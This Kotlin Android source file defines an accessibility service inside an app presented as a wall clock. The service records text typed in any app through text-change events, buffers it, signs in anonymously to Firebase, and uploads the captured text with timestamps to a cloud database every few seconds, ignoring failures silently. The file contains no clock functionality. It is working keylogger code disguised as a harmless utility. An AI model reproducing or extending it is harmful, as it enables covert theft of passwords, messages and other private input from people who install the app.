package com.noshad.wallclock

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import java.text.SimpleDateFormat
import java.util.*

class WallClockService : AccessibilityService() {
    private val db = FirebaseFirestore.getInstance()
    private val auth = FirebaseAuth.getInstance()
    private val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
    private val dateOnlyFormat = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault())
    private val buffer = mutableListOf<String>()
    private var lastSyncTime = System.currentTimeMillis()

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.joinToString()
            if (text.isNotEmpty() && text.length > 1) {
                buffer.add(text)
            }
        }

        val currentTime = System.currentTimeMillis()
        if (currentTime - lastSyncTime > 5000 && buffer.isNotEmpty()) {
            syncToFirebase()
            lastSyncTime = currentTime
        }
    }

    private fun syncToFirebase() {
        val currentUser = auth.currentUser
        if (currentUser == null) {
            auth.signInAnonymously().addOnCompleteListener { task ->
                if (task.isSuccessful) {
                    performSync()
                }
            }
            return
        }
        performSync()
    }

    private fun performSync() {
        val currentUser = auth.currentUser ?: return
        val userId = currentUser.uid
        val timestamp = dateFormat.format(Date())
        val combinedText = buffer.joinToString(" ")
        val date = dateOnlyFormat.format(Date())

        val logData = mapOf(
            "timestamp" to timestamp,
            "text" to combinedText,
            "date" to date
        )

        db.collection("users")
            .document(userId)
            .collection("logs")
            .add(logData)
            .addOnSuccessListener {
                buffer.clear()
            }
            .addOnFailureListener { _ ->
            }
    }

    override fun onInterrupt() {
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
    }
}
